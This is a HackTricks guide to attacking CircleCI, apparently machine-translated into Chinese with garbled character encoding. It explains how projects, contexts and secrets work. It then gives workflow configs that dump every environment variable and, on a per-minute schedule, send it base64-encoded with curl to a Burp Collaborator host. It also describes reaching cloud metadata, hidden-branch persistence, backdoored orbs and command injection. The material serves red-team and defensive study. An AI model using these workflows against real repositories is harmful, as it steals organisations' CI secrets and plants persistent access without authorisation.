# CircleCI å®‰å…¨

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### åŸºæœ¬ä¿¡æ¯

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) æ˜¯ä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­ **å®šä¹‰æ¨¡æ¿** æŒ‡ç¤ºæ‚¨å¸Œæœ›å®ƒå¯¹æŸäº›ä»£ç åšä»€ä¹ˆä»¥åŠä½•æ—¶æ‰§è¡Œã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ‚¨å¯ä»¥ **è‡ªåŠ¨åŒ–æµ‹è¯•** æˆ– **éƒ¨ç½²**ï¼Œä¾‹å¦‚ç›´æ¥ **ä»æ‚¨çš„ä»£ç åº“ä¸»åˆ†æ”¯**ã€‚

### æƒé™

**CircleCI** **ç»§æ‰¿** ä¸ç™»å½•çš„ **è´¦æˆ·** ç›¸å…³çš„ github å’Œ bitbucket çš„æƒé™ã€‚\
åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œæˆ‘æ£€æŸ¥åˆ°åªè¦æ‚¨åœ¨ github ä¸Šå¯¹ä»£ç åº“å…·æœ‰ **å†™æƒé™**ï¼Œæ‚¨å°±å¯ä»¥ **ç®¡ç† CircleCI ä¸­çš„é¡¹ç›®è®¾ç½®**ï¼ˆè®¾ç½®æ–°çš„ ssh å¯†é’¥ã€è·å–é¡¹ç›® api å¯†é’¥ã€åˆ›å»ºå¸¦æœ‰æ–° CircleCI é…ç½®çš„æ–°åˆ†æ”¯...ï¼‰ã€‚

ä½†æ˜¯ï¼Œæ‚¨éœ€è¦æˆä¸º **ä»£ç åº“ç®¡ç†å‘˜** æ‰èƒ½ **å°†ä»£ç åº“è½¬æ¢ä¸º CircleCI é¡¹ç›®**ã€‚

### ç¯å¢ƒå˜é‡å’Œç§˜å¯†

æ ¹æ® [**æ–‡æ¡£**](https://circleci.com/docs/2.0/env-vars/)ï¼Œåœ¨å·¥ä½œæµä¸­æœ‰ä¸åŒçš„æ–¹æ³•æ¥ **åŠ è½½ç¯å¢ƒå˜é‡ä¸­çš„å€¼**ã€‚

#### å†…ç½®ç¯å¢ƒå˜é‡

æ¯ä¸ªç”± CircleCI è¿è¡Œçš„å®¹å™¨å°†å§‹ç»ˆå…·æœ‰ [**æ–‡æ¡£ä¸­å®šä¹‰çš„ç‰¹å®šç¯å¢ƒå˜é‡**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)ï¼Œå¦‚ `CIRCLE_PR_USERNAME`ã€`CIRCLE_PROJECT_REPONAME` æˆ– `CIRCLE_USERNAME`ã€‚

#### æ˜æ–‡

æ‚¨å¯ä»¥åœ¨ **å‘½ä»¤** ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
æ‚¨å¯ä»¥åœ¨ **run environment** ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨ **build-job environment** ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨ **å®¹å™¨çš„ç¯å¢ƒ** ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### é¡¹ç›®ç§˜å¯†

è¿™äº›æ˜¯**ç§˜å¯†**ï¼Œåªæœ‰**é¡¹ç›®**ï¼ˆé€šè¿‡**ä»»ä½•åˆ†æ”¯**ï¼‰å¯ä»¥**è®¿é—®**ã€‚\
æ‚¨å¯ä»¥åœ¨ _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ ä¸­æŸ¥çœ‹å®ƒä»¬**å£°æ˜**ã€‚

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
â€œ**å¯¼å…¥å˜é‡**â€åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®**å¯¼å…¥å˜é‡**åˆ°è¿™ä¸ªé¡¹ç›®ã€‚
{% endhint %}

#### ä¸Šä¸‹æ–‡ç§˜å¯†

è¿™äº›æ˜¯**ç»„ç»‡èŒƒå›´å†…**çš„ç§˜å¯†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ**ä»»ä½•ä»“åº“**éƒ½å¯ä»¥**è®¿é—®**å­˜å‚¨åœ¨è¿™é‡Œçš„**ä»»ä½•ç§˜å¯†**ï¼š

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œå¯ä»¥é€‰æ‹©ä¸åŒçš„ç»„ï¼ˆè€Œä¸æ˜¯æ‰€æœ‰æˆå‘˜ï¼‰æ¥**ä»…å‘ç‰¹å®šäººå‘˜æä¾›å¯¹ç§˜å¯†çš„è®¿é—®**ã€‚\
è¿™ç›®å‰æ˜¯**æé«˜ç§˜å¯†å®‰å…¨æ€§**çš„æœ€ä½³æ–¹æ³•ä¹‹ä¸€ï¼Œä¸å…è®¸æ¯ä¸ªäººè®¿é—®å®ƒä»¬ï¼Œè€Œåªæ˜¯ä¸€äº›äººã€‚
{% endhint %}

### æ”»å‡»

#### æœç´¢æ˜æ–‡ç§˜å¯†

å¦‚æœæ‚¨æœ‰**è®¿é—®VCS**ï¼ˆå¦‚githubï¼‰ï¼Œè¯·æ£€æŸ¥**æ¯ä¸ªä»“åº“æ¯ä¸ªåˆ†æ”¯**çš„æ–‡ä»¶ `.circleci/config.yml` å¹¶**æœç´¢**æ½œåœ¨çš„**æ˜æ–‡ç§˜å¯†**ã€‚

#### ç§˜å¯†ç¯å¢ƒå˜é‡å’Œä¸Šä¸‹æ–‡æšä¸¾

æ£€æŸ¥ä»£ç ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°åœ¨æ¯ä¸ª `.circleci/config.yml` æ–‡ä»¶ä¸­**ä½¿ç”¨**çš„**æ‰€æœ‰ç§˜å¯†åç§°**ã€‚æ‚¨è¿˜å¯ä»¥ä»è¿™äº›æ–‡ä»¶ä¸­è·å–**ä¸Šä¸‹æ–‡åç§°**ï¼Œæˆ–åœ¨ç½‘ç»œæ§åˆ¶å°ä¸­æŸ¥çœ‹ï¼š_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ã€‚

#### å¤–æ³„é¡¹ç›®ç§˜å¯†

{% hint style="warning" %}
ä¸ºäº†**å¤–æ³„æ‰€æœ‰**é¡¹ç›®å’Œä¸Šä¸‹æ–‡çš„**ç§˜å¯†**ï¼Œæ‚¨**åªéœ€**å¯¹æ•´ä¸ªgithubç»„ç»‡ä¸­çš„**1ä¸ªä»“åº“**å…·æœ‰**å†™å…¥**æƒé™ï¼ˆ_å¹¶ä¸”æ‚¨çš„å¸æˆ·å¿…é¡»å¯¹ä¸Šä¸‹æ–‡å…·æœ‰è®¿é—®æƒé™ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªäººéƒ½å¯ä»¥è®¿é—®æ¯ä¸ªä¸Šä¸‹æ–‡_ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
â€œ**å¯¼å…¥å˜é‡**â€åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®**å¯¼å…¥å˜é‡**åˆ°è¿™ä¸ªé¡¹ç›®ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥**ä»æ‰€æœ‰ä»“åº“å¯¼å…¥æ‰€æœ‰é¡¹ç›®å˜é‡**ï¼Œç„¶å**ä¸€èµ·å¤–æ³„æ‰€æœ‰å˜é‡**ã€‚
{% endhint %}

æ‰€æœ‰é¡¹ç›®ç§˜å¯†å§‹ç»ˆåœ¨ä½œä¸šçš„ç¯å¢ƒä¸­è®¾ç½®ï¼Œå› æ­¤åªéœ€è°ƒç”¨ç¯å¢ƒå¹¶å°†å…¶æ··æ·†ä¸ºbase64ï¼Œå°†åœ¨**å·¥ä½œæµç½‘ç»œæ—¥å¿—æ§åˆ¶å°**ä¸­å¤–æ³„ç§˜å¯†ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®ç½‘ç»œæ§åˆ¶å°**ï¼Œä½†æ‚¨æœ‰**å¯¹ä»£ç åº“çš„è®¿é—®æƒé™**å¹¶ä¸”çŸ¥é“ä½¿ç”¨äº†CircleCIï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ªå·¥ä½œæµ**ï¼Œè¯¥å·¥ä½œæµ**æ¯åˆ†é’Ÿè§¦å‘ä¸€æ¬¡**å¹¶ä¸”**å°†ç§˜å¯†å¯¼å‡ºåˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### æå–ä¸Šä¸‹æ–‡ç§˜å¯†

æ‚¨éœ€è¦**æŒ‡å®šä¸Šä¸‹æ–‡åç§°**ï¼ˆè¿™ä¹Ÿå°†æå–é¡¹ç›®ç§˜å¯†ï¼‰ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®ç½‘ç»œæ§åˆ¶å°**ï¼Œä½†æ‚¨æœ‰**å¯¹ä»£ç åº“çš„è®¿é—®æƒé™**å¹¶ä¸”çŸ¥é“ä½¿ç”¨äº†CircleCIï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹ä¸€ä¸ªæ¯åˆ†é’Ÿè§¦å‘çš„å·¥ä½œæµ**ï¼Œå¹¶ä¸”è¯¥å·¥ä½œæµ**å°†ç§˜å¯†å¯¼å‡ºåˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
ä»…ä»…åœ¨ä¸€ä¸ªä»“åº“ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ `.circleci/config.yml` **å¹¶ä¸è¶³ä»¥è§¦å‘ circleci æ„å»º**ã€‚ä½ éœ€è¦åœ¨ **circleci æ§åˆ¶å°ä¸­å°†å…¶å¯ç”¨ä¸ºé¡¹ç›®**ã€‚
{% endhint %}

#### é€ƒå¾€äº‘ç«¯

**CircleCI** è®©ä½ å¯ä»¥é€‰æ‹© **åœ¨ä»–ä»¬çš„æœºå™¨ä¸Šæˆ–åœ¨ä½ è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œæ„å»º**ã€‚\
é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æœºå™¨ä½äº GCPï¼Œæœ€åˆä½ å¯èƒ½æ‰¾ä¸åˆ°ä»»ä½•ç›¸å…³ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœå—å®³è€…åœ¨ **ä»–ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä»»åŠ¡ï¼ˆå¯èƒ½æ˜¯åœ¨äº‘ç¯å¢ƒä¸­ï¼‰**ï¼Œä½ å¯èƒ½ä¼šæ‰¾åˆ°ä¸€ä¸ª **åŒ…å«æœ‰è¶£ä¿¡æ¯çš„äº‘å…ƒæ•°æ®ç«¯ç‚¹**ã€‚

è¯·æ³¨æ„ï¼Œåœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯åœ¨ docker å®¹å™¨å†…å¯åŠ¨çš„ï¼Œä½†ä½ ä¹Ÿå¯ä»¥ **è¯·æ±‚å¯åŠ¨ä¸€å°è™šæ‹Ÿæœº**ï¼ˆè¿™å¯èƒ½å…·æœ‰ä¸åŒçš„äº‘æƒé™ï¼‰ï¼š
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
æˆ–è€…ç”šè‡³æ˜¯ä¸€ä¸ªå¯ä»¥è®¿é—®è¿œç¨‹ docker æœåŠ¡çš„ docker å®¹å™¨ï¼š
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### æŒä¹…æ€§

* å¯ä»¥åœ¨ **CircleCI** ä¸­ **åˆ›å»ºç”¨æˆ·ä»¤ç‰Œ** ä»¥ä½¿ç”¨ç”¨æˆ·çš„è®¿é—®æƒé™è®¿é—® API ç«¯ç‚¹ã€‚
* _https://app.circleci.com/settings/user/tokens_
* å¯ä»¥ **åˆ›å»ºé¡¹ç›®ä»¤ç‰Œ** ä»¥ä½¿ç”¨ä»¤ç‰Œæˆäºˆçš„æƒé™è®¿é—®é¡¹ç›®ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* å¯ä»¥ **å‘é¡¹ç›®æ·»åŠ  SSH å¯†é’¥**ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* å¯ä»¥åœ¨ä¸€ä¸ªæ„å¤–çš„é¡¹ç›®ä¸­ **åœ¨éšè—åˆ†æ”¯ä¸­åˆ›å»ºå®šæ—¶ä»»åŠ¡**ï¼Œæ¯å¤© **æ³„éœ²** æ‰€æœ‰ **ä¸Šä¸‹æ–‡ç¯å¢ƒ** å˜é‡ã€‚
* æˆ–è€…ç”šè‡³åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­åˆ›å»º/ä¿®æ”¹ä¸€ä¸ªå·²çŸ¥çš„ä»»åŠ¡ï¼Œæ¯å¤© **æ³„éœ²** æ‰€æœ‰ä¸Šä¸‹æ–‡å’Œ **é¡¹ç›®æœºå¯†**ã€‚
* å¦‚æœä½ æ˜¯ GitHub çš„æ‰€æœ‰è€…ï¼Œå¯ä»¥ **å…è®¸æœªéªŒè¯çš„ orbs** å¹¶åœ¨ä»»åŠ¡ä¸­å°†å…¶é…ç½®ä¸º **åé—¨**ã€‚
* å¯ä»¥åœ¨æŸäº›ä»»åŠ¡ä¸­æ‰¾åˆ° **å‘½ä»¤æ³¨å…¥æ¼æ´** å¹¶é€šè¿‡ **ç§˜å¯†** ä¿®æ”¹å…¶å€¼æ¥ **æ³¨å…¥å‘½ä»¤**ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
